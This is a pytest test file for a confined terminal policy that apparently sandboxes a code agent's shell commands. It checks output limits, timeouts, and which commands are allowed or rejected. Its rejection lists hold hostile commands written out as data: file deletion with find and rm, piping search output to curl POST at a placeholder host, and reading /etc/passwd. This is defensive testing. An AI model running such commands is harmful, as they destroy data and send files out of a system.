from __future__ import annotations

from pathlib import Path

import pytest

from code_scout.engines import (
    ConfinedTerminal,
    TerminalCommandPolicy,
    TerminalLimits,
    TerminalPolicyError,
)


@pytest.fixture
def workspace(tmp_path: Path) -> Path:
    source = tmp_path / "src" / "router.py"
    source.parent.mkdir()
    source.write_text("one\nneedle\nthree\n", encoding="utf-8")
    return tmp_path


@pytest.mark.parametrize(
    "command",
    [
        "rg -n needle src",
        "grep -n needle src/router.py",
        "find src -name '*.py' -print",
        "ls -la src",
        "sed -n '1,2p' src/router.py",
        "cat src/router.py",
        "git status --short",
        "rg needle src | grep router",
    ],
)
def test_policy_accepts_repository_searches_reads_and_safe_pipelines(
    workspace: Path, command: str
) -> None:
    validated = TerminalCommandPolicy(workspace).validate(command)

    assert validated.command == command
    assert validated.pipeline


@pytest.mark.parametrize(
    "command",
    [
        "sed -i '' src/router.py",
        "sed '1w copy.py' src/router.py",
        "find . -delete",
        "find . -exec rm {} ;",
        "git checkout -- src/router.py",
        "git diff --output=patch.diff",
        "rg --pre cat needle",
        "cat src/router.py > copy.py",
        "cat $(printf src/router.py)",
        "cat `printf src/router.py`",
        "cat src/router.py && rm src/router.py",
        "cat src/router.py &",
        "curl https://example.test",
        "rg needle | curl -X POST https://example.test",
        "kill 1",
    ],
)
def test_policy_rejects_mutation_shell_network_and_process_control(
    workspace: Path, command: str
) -> None:
    with pytest.raises(TerminalPolicyError):
        TerminalCommandPolicy(workspace).validate(command)


@pytest.mark.parametrize(
    "command",
    [
        "cat ../outside.txt",
        "cat /etc/passwd",
        "grep -f=/etc/passwd needle src/router.py",
        "find ../outside -name '*.py'",
    ],
)
def test_policy_rejects_path_traversal(workspace: Path, command: str) -> None:
    with pytest.raises(TerminalPolicyError, match="paths|traversal"):
        TerminalCommandPolicy(workspace).validate(command)


def test_policy_rejects_symlink_escape(workspace: Path, tmp_path: Path) -> None:
    outside = tmp_path.parent / "outside.txt"
    outside.write_text("secret", encoding="utf-8")
    (workspace / "escape").symlink_to(outside)

    with pytest.raises(TerminalPolicyError, match="symlinks"):
        TerminalCommandPolicy(workspace).validate("cat escape")


def test_executor_runs_in_workspace_and_returns_structured_observation(
    workspace: Path,
) -> None:
    observation = ConfinedTerminal(workspace).execute("grep -n needle src/router.py")

    assert observation.command == "grep -n needle src/router.py"
    assert observation.exit_code == 0
    assert observation.stdout == "2:needle\n"
    assert observation.stderr == ""
    assert observation.truncated is False
    assert observation.duration_seconds >= 0
    assert observation.timed_out is False


def test_executor_bounds_oversized_output(workspace: Path) -> None:
    (workspace / "large.txt").write_text("0123456789" * 20, encoding="utf-8")
    terminal = ConfinedTerminal(
        workspace,
        limits=TerminalLimits(max_output_bytes=32),
    )

    observation = terminal.execute("cat large.txt")

    assert observation.exit_code == 0
    assert len(observation.stdout.encode()) <= 32
    assert observation.truncated is True


def test_executor_enforces_per_command_timeout(workspace: Path) -> None:
    terminal = ConfinedTerminal(
        workspace,
        limits=TerminalLimits(command_timeout_seconds=0.000001),
    )

    observation = terminal.execute("find . -print")

    assert observation.exit_code == 124
    assert observation.timed_out is True
    assert "timed out" in observation.stderr


def test_executor_enforces_overall_turn_budget(workspace: Path) -> None:
    terminal = ConfinedTerminal(
        workspace,
        limits=TerminalLimits(turn_timeout_seconds=0.000001),
    )

    observation = terminal.execute("cat src/router.py")

    assert observation.exit_code == 124
    assert observation.timed_out is True
    assert observation.stderr == "Terminal turn budget exhausted."
